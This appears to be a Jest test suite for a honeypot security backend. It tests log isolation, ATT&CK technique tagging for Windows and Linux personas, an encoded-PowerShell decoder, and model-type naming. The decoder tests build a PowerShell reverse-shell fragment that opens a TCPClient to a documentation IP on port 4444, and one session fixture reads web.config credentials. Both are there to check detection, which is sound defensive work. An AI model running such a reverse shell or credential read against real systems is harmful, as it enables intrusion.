'use strict'
/**
 * Rank 8 remediation: test-log isolation (utils/logPaths.js and every file sink), persona-gated ATT&CK persistence,
 * and the F5 encoded-PowerShell decoder. Logger mocked; in-memory MongoDB; temporary directories only.
 */
jest.mock('../utils/logger', () => ({ info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn() }))

const fs = require('fs')
const os = require('os')
const path = require('path')
const crypto = require('crypto')

const REAL_LOGS = path.resolve(__dirname, '..', 'logs')
const snapshot = () => {
  if (!fs.existsSync(REAL_LOGS)) return {}
  const out = {}
  for (const f of fs.readdirSync(REAL_LOGS)) {
    const p = path.join(REAL_LOGS, f)
    if (fs.statSync(p).isFile()) out[f] = crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex')
  }
  return out
}
const BEFORE = snapshot()

afterAll(() => {
  // the real application log directory is byte-identical after this suite: nothing written, rotated or deleted
  expect(snapshot()).toEqual(BEFORE)
})

describe('log isolation (utils/logPaths.js)', () => {
  const logPaths = require('../utils/logPaths')
  const saved = {}
  beforeEach(() => {
    for (const k of ['LOG_DIR', 'EMERGENCY_AUDIT_DIR', 'CONTAINMENT_AUDIT_SPOOL_DIR', 'OUTBOX_DIR'])
      saved[k] = process.env[k]
  })
  afterEach(() => {
    for (const [k, v] of Object.entries(saved))
      if (v === undefined) delete process.env[k]
      else process.env[k] = v
  })

  test('the Jest setup points every sink at a temporary directory', () => {
    for (const k of ['LOG_DIR', 'EMERGENCY_AUDIT_DIR', 'OUTBOX_DIR']) {
      expect(process.env[k]).toBeTruthy()
      expect(logPaths.isInsideRealLogDir(process.env[k])).toBe(false)
    }
  })

  test('LOG_DIR is respected', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'r8-logdir-'))
    process.env.LOG_DIR = dir
    delete process.env.EMERGENCY_AUDIT_DIR
    expect(logPaths.logDir()).toBe(path.resolve(dir))
    expect(logPaths.logDir('EMERGENCY_AUDIT_DIR')).toBe(path.resolve(dir)) // falls back to LOG_DIR
  })

  test('under Jest the real backend/logs is refused even when configured explicitly', () => {
    for (const k of ['LOG_DIR', 'EMERGENCY_AUDIT_DIR', 'CONTAINMENT_AUDIT_SPOOL_DIR', 'OUTBOX_DIR']) {
      process.env[k] = REAL_LOGS
      expect(logPaths.isInsideRealLogDir(logPaths.logDir(k))).toBe(false)
      process.env[k] = path.join(REAL_LOGS, 'nested', '..')
      expect(logPaths.isInsideRealLogDir(logPaths.logDir(k))).toBe(false)
    }
    delete process.env.LOG_DIR
    expect(logPaths.isInsideRealLogDir(logPaths.logDir())).toBe(false) // the production default is refused too
  })

  test('outside Jest the production default is unchanged (backend/logs)', () => {
    const worker = process.env.JEST_WORKER_ID
    delete process.env.JEST_WORKER_ID
    delete process.env.LOG_DIR
    try {
      expect(logPaths.logDir()).toBe(REAL_LOGS)
    } finally {
      process.env.JEST_WORKER_ID = worker
    }
  })

  test('emergency audit events go to the isolated destination; rotation stays there', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'r8-emergency-'))
    process.env.EMERGENCY_AUDIT_DIR = dir
    const ea = require('../utils/emergencyAudit')
    const r = ea.writeEmergencyAudit({ event: 'R8_TEST', password: 'never-written' })
    expect(r.success).toBe(true)
    expect(path.dirname(r.path)).toBe(path.resolve(dir))
    expect(ea.EMERGENCY_AUDIT_PATH).toBe(r.path) // the legacy export still works and follows the destination
    const text = fs.readFileSync(r.path, 'utf8')
    expect(text).toContain('R8_TEST')
    expect(text).not.toContain('never-written')
    // a configured real directory is refused under Jest
    process.env.EMERGENCY_AUDIT_DIR = REAL_LOGS
    expect(require('../utils/logPaths').isInsideRealLogDir(path.dirname(ea.EMERGENCY_AUDIT_PATH))).toBe(false)
  })

  test('the file outbox and the containment audit spool default to the isolated directory', () => {
    const { FileOutboxStore } = require('../utils/securityEventBus')
    const store = new FileOutboxStore()
    expect(require('../utils/logPaths').isInsideRealLogDir(store.filePath)).toBe(false)
    expect(fs.existsSync(store.filePath)).toBe(true)
    const src = fs.readFileSync(path.join(__dirname, '..', 'utils', 'containmentAudit.js'), 'utf8')
    expect(src).toMatch(/logDir\('CONTAINMENT_AUDIT_SPOOL_DIR'\)/)
    expect(src).not.toMatch(/path\.join\(__dirname, '\.\.', 'logs'\)/)
  })

  test('no backend source writes to a hard-coded backend/logs path any more', () => {
    const files = [
      'utils/logger.js',
      'utils/emergencyAudit.js',
      'utils/containmentAudit.js',
      'utils/securityEventBus.js',
    ]
    for (const f of files) {
      const src = fs.readFileSync(path.join(__dirname, '..', f), 'utf8')
      expect([f, /path\.join\(__dirname,\s*'(\.\.\/logs|\.\.)',\s*'logs'/.test(src)]).toEqual([f, false])
      expect([f, /'\.\.\/logs'/.test(src)]).toEqual([f, false])
    }
  })
})

describe('persona-gated ATT&CK persistence (in-memory MongoDB)', () => {
  const mongoose = require('mongoose')
  const { MongoMemoryServer } = require('mongodb-memory-server')
  let mongoServer
  let HoneypotSession
  let hs
  beforeAll(async () => {
    jest.doMock('../services/aiEngineService', () => ({}))
    jest.doMock('../websocket/socketManager', () => ({}))
    mongoServer = await MongoMemoryServer.create()
    await mongoose.connect(mongoServer.getUri())
    HoneypotSession = require('../models/HoneypotSession')
    hs = require('../services/honeypotService')
  }, 60000)
  afterAll(async () => {
    await mongoose.disconnect()
    if (mongoServer) await mongoServer.stop()
  })

  const cmds = (c) => [{ command: c, intent: 'RECONNAISSANCE', timestamp: new Date(), success: true }]

  test('a Windows-simulation session gets Windows techniques; a Linux session never does', async () => {
    await HoneypotSession.create([
      { sessionId: 'r8-win', sourceIP: '198.51.100.9', servedProfile: 'windows_srv' },
      { sessionId: 'r8-lin', sourceIP: '198.51.100.9', servedProfile: 'ubuntu_22' },
    ])
    await hs.recordSessionActivity({ sessionId: 'r8-win' }, { commands: cmds('systeminfo') })
    await hs.recordSessionActivity({ sessionId: 'r8-lin' }, { commands: cmds('systeminfo') })
    await hs.recordSessionActivity({ sessionId: 'r8-lin' }, { commands: cmds('uname -a') })
    const win = await HoneypotSession.findOne({ sessionId: 'r8-win' }).lean()
    const lin = await HoneypotSession.findOne({ sessionId: 'r8-lin' }).lean()
    expect(win.mitreTechniques).toEqual([{ id: 'T1082', name: 'System Information Discovery' }])
    expect(lin.mitreTechniques).toEqual([{ id: 'T1082', name: 'System Information Discovery' }]) // from uname only
    // stored shape is unchanged ({id, name}); no T1595 for on-host reconnaissance
    for (const t of [...win.mitreTechniques, ...lin.mitreTechniques])
      expect(Object.keys(t).sort()).toEqual(['id', 'name'])
  })

  test('a Linux session never acquires a Windows-only technique through the save hook', async () => {
    const s = await HoneypotSession.create({
      sessionId: 'r8-hook',
      sourceIP: '198.51.100.9',
      servedProfile: 'centos_7',
      commands: cmds('type C:\\inetpub\\wwwroot\\web.config'),
    })
    expect(s.mitreTechniques).toEqual([])
    const w = await HoneypotSession.create({
      sessionId: 'r8-hook-w',
      sourceIP: '198.51.100.9',
      servedProfile: 'windows_srv',
      commands: cmds('type C:\\inetpub\\wwwroot\\web.config'),
    })
    expect(w.mitreTechniques.map((t) => t.id)).toEqual(['T1552.001'])
  })
})

describe('F5: encoded PowerShell decoding (JS)', () => {
  const { encodedPowerShell, classifyWindowsIntent } = require('../utils/windowsPersona')
  const enc = (s) => Buffer.from(s, 'utf16le').toString('base64')
  test('decodes only an explicit -enc / -EncodedCommand payload', () => {
    expect(encodedPowerShell(`powershell -enc ${enc('Get-Process')}`)).toBe('Get-Process')
    expect(encodedPowerShell(`powershell -EncodedCommand ${enc('Get-Process')}`)).toBe('Get-Process')
    expect(encodedPowerShell(`powershell -e ${enc('Get-Process')}`)).toBeNull() // bare -e is not explicit
    expect(encodedPowerShell(`echo -enc ${enc('Get-Process')}`)).toBeNull() // not a powershell invocation
    expect(encodedPowerShell('powershell -enc QUJD')).toBeNull() // odd byte count is not UTF-16LE
    expect(encodedPowerShell('powershell -enc !!!notbase64!!!')).toBeNull()
  })
  test('a reverse shell needs the explicit flag AND a reverse-shell payload', () => {
    const rs = enc("$c = New-Object System.Net.Sockets.TCPClient('198.51.100.7',4444);$s = $c.GetStream()")
    expect(classifyWindowsIntent(`powershell -enc ${rs}`)).toBe('REVERSE_SHELL')
    expect(classifyWindowsIntent(`powershell -enc ${enc('Write-Output hi')}`)).toBe('UNKNOWN')
    expect(classifyWindowsIntent('echo -e aaaaaaaaaaaaaaaaaaaaaaaa')).toBe('UNKNOWN')
  })
})

describe('XGBoost naming with backward compatibility (AIPrediction)', () => {
  const AIPrediction = require('../models/AIPrediction')
  const base = { inputSource: 'network_traffic', predictedClass: 'DDoS', threatScore: 0.9 }
  test('the served classifier is stored as xgboost; legacy values still validate', () => {
    for (const modelType of ['xgboost', 'ensemble', 'random_forest', 'rules', 'stacking', 'unknown'])
      expect(new AIPrediction({ ...base, modelType }).validateSync()).toBeUndefined()
    expect(new AIPrediction({ ...base, modelType: 'not-a-model' }).validateSync()).toBeDefined()
  })
  test('a record without model fields is unknown, never silently a Random Forest', () => {
    const p = new AIPrediction(base)
    expect(p.modelType).toBe('unknown')
    expect(p.modelVersion).toBe('unknown')
  })
  test('the pipeline maps the engine-reported type and keeps a safe fallback for older engines', () => {
    const src = require('fs').readFileSync(
      require('path').join(__dirname, '..', 'services', 'aiEngineService.js'),
      'utf8'
    )
    expect(src).toMatch(/\['xgboost', 'random_forest', 'stacking'\]\.includes\(result\.modelType\)/)
    expect(src).not.toMatch(/\? 'ensemble' : 'random_forest'/)
  })
})
